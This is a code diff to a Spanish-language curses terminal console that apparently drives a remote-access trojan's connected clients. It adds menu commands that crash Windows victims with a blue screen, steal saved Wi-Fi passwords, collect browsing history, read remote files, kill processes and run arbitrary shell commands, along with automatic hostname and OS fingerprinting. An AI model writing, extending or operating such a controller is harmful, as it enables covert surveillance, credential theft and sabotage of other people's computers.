@@ -17,9 +17,9 @@ def init_colors():
     colors['help'] = 5
 
     curses.init_pair(1, curses.COLOR_BLUE, curses.COLOR_BLACK)
-    curses.init_pair(2, curses.COLOR_BLUE, curses.COLOR_BLACK)
+    curses.init_pair(2, curses.COLOR_CYAN, curses.COLOR_BLACK)
     curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)
-    curses.init_pair(4, curses.COLOR_RED, curses.COLOR_BLACK)
+    curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)
     curses.init_pair(5, curses.COLOR_YELLOW, curses.COLOR_BLACK)
 
 
@@ -39,14 +39,39 @@ def draw_box(win, y, x, height, width):
     win.addch(y + height - 1, x + width - 1, curses.ACS_LRCORNER)
 
 
-def get_command_args(stdscr, command, command_args):
+# Diccionario de traducción de comandos
+command_translations = {
+    "Sistema": "os",
+    "Matar proceso": "kill",
+    "Usuarios": "users",
+    "pantalla azul": "Death",
+    "Procesos": "processes",
+    "Unidades": "drives",
+    "Archivos": "files",
+    "Ver archivo": "download",
+    "Red": "network",
+    "Historial de navegación": "history",
+    "Contraseñas de wifi": "get_wifi_passwords",
+    "Servicios": "services",
+    "Ejecutar comando": "shell",
+    "Info del sistema": "system_info",
+    "Variables de entorno": "environment",
+    "Software instalado": "installed_software",
+    "Conexiones de red": "network_connections",
+    "Desinstalar herramienta": "Uninstall tool"
+}
+
+
+def get_command_args(stdscr, display_command):
     """Solicita los argumentos necesarios para un comando."""
+    # Obtener el comando real basado en el nombre mostrado
+    command = command_translations.get(display_command, display_command)
+
     command_arg_map = {
         "kill": ["pid", "Ingrese el PID del proceso a terminar: "],
         "files": ["path", "Ingrese la ruta a listar (Enter para actual): "],
         "shell": ["command", "Ingrese el comando a ejecutar: "],
         "download": ["remote_path", "Ingrese la ruta del archivo remoto: "],
-        "upload": ["local_path", "Ingrese la ruta del archivo local: "],
     }
 
     if command not in command_arg_map:
@@ -56,7 +81,7 @@ def get_command_args(stdscr, command, command_args):
     stdscr.clear()
     draw_box(stdscr, 0, 0, height - 1, width - 1)
 
-    title = f"Ingrese argumentos para {command}"
+    title = f"Ingrese argumentos para {display_command}"
     title_pos = max(1, (width - len(title)) // 2)
     stdscr.attron(curses.color_pair(colors['header']) | curses.A_BOLD)
     stdscr.addstr(1, title_pos, title)
@@ -77,7 +102,6 @@ def get_command_args(stdscr, command, command_args):
     curses.noecho()
     curses.curs_set(0)
 
-    # Devolver el comando con sus argumentos en el formato adecuado
     return f"{command} {arg}" if arg else command
 
 
@@ -85,9 +109,9 @@ def display_client_info(stdscr, client_serv):
     """Muestra información del cliente conectado."""
     info = [
         f"IP: {client_serv.address[0]}:{client_serv.address[1]}",
-        f"Hostname: {client_serv.hostname or 'N/A'}",
-        f"OS: {client_serv.os or 'N/A'}",
-        f"Last seen: {client_serv.last_seen.strftime('%Y-%m-%d %H:%M:%S')}"
+        f"Nombre del equipo: {client_serv.hostname or 'N/A'}",
+        f"Sistema operativo: {client_serv.os or 'N/A'}",
+        f"Última vez: {client_serv.last_seen.strftime('%Y-%m-%d %H:%M:%S')}"
     ]
 
     for i, line in enumerate(info):
@@ -99,13 +123,30 @@ def display_commands(stdscr, client_serv):
     curses.curs_set(0)
     current_row = 0
 
-    # Lista de comandos disponibles
-    command_list = [
-        "hostname", "ip", "os", "users", "processes", "drives",
-        "files", "download", "upload", "network", "services",
-        "kill", "shell", "system_info", "environment",
-        "installed_software", "network_connections"
-    ]
+    # Lista de comandos en español
+    if client_serv.send_command('os').split(': ')[1].split('\n')[0] == "Windows":
+        display_command_list = [
+            "Sistema", "Matar proceso","pantalla azul", "Usuarios", "Procesos",
+            "Unidades", "Archivos", "Ver archivo", "Red",
+            "Servicios", "Ejecutar comando","Historial de navegación","Contraseñas de wifi",
+            "Variables de entorno", "Software instalado", "Conexiones de red"
+
+        ]
+    else:
+        display_command_list = [
+            "Sistema", "Matar proceso", "Usuarios", "Procesos",
+            "Unidades", "Archivos", "Ver archivo", "Red",
+            "Servicios", "Ejecutar comando",
+            "Variables de entorno", "Software instalado", "Conexiones de red"
+        ]
+
+    try:
+        client_serv.hostname = client_serv.send_command('hostname').split(': ')[1]
+        client_serv.os = client_serv.send_command('os').split(': ')[1].split('\n')[0]
+        print(f"{client_serv.send_command('os').split(': ')[1].split(' Versión')[0]}")
+        print(f"{client_serv.os}")
+    except Exception as e:
+        print("Error al obtener información del cliente:", str(e))
 
     while True:
         stdscr.clear()
@@ -121,28 +162,26 @@ def display_commands(stdscr, client_serv):
         stdscr.addstr(1, title_pos, title[:safe_width - 2])
         stdscr.attroff(curses.color_pair(colors['header']) | curses.A_BOLD)
 
-        # Mostrar información del cliente
         display_client_info(stdscr, client_serv)
 
-        # Área de comandos
-        commands_height = min(len(command_list) + 4, safe_height - 10)
+        commands_height = min(len(display_command_list) + 4, safe_height - 10)
         commands_width = min(30, safe_width - 4)
-        commands_y = 8  # Ajustado para dejar espacio para la info del cliente
+        commands_y = 8
         commands_x = max(1, (safe_width - commands_width) // 2)
         draw_box(stdscr, commands_y, commands_x, commands_height, commands_width)
 
-        visible_commands = min(commands_height - 4, len(command_list))
+        visible_commands = min(commands_height - 4, len(display_command_list))
         for idx in range(visible_commands):
             y = commands_y + idx + 2
             x = commands_x + 2
             if y < safe_height - 1:
-                command = command_list[idx]
+                display_command = display_command_list[idx]
                 if idx == current_row:
                     stdscr.attron(curses.color_pair(colors['selected']))
-                    stdscr.addstr(y, x, f" {command} ".ljust(commands_width - 4)[:commands_width - 4])
+                    stdscr.addstr(y, x, f" {display_command} ".ljust(commands_width - 4)[:commands_width - 4])
                     stdscr.attroff(curses.color_pair(colors['selected']))
                 else:
-                    stdscr.addstr(y, x, command[:commands_width - 4])
+                    stdscr.addstr(y, x, display_command[:commands_width - 4])
 
         if status_message and safe_height > 4:
             status_y = safe_height - 2
@@ -162,17 +201,17 @@ def display_commands(stdscr, client_serv):
         key = stdscr.getch()
         if key == curses.KEY_UP and current_row > 0:
             current_row -= 1
-        elif key == curses.KEY_DOWN and current_row < len(command_list) - 1:
+        elif key == curses.KEY_DOWN and current_row < len(display_command_list) - 1:
             current_row += 1
         elif key in (curses.KEY_ENTER, 10, 13):
-            selected_command = command_list[current_row]
-            command_with_args = get_command_args(stdscr, selected_command, None)
+            display_command = display_command_list[current_row]
+            command_with_args = get_command_args(stdscr, display_command)
             try:
                 output = client_serv.send_command(command_with_args)
                 client_serv.last_seen = datetime.now()
                 show_output(stdscr, str(output))
             except Exception as e:
-                show_output(stdscr, f"Error executing command: {str(e)}")
+                show_output(stdscr, f"Error al ejecutar el comando: {str(e)}")
         elif key == ord('q'):
             break
 
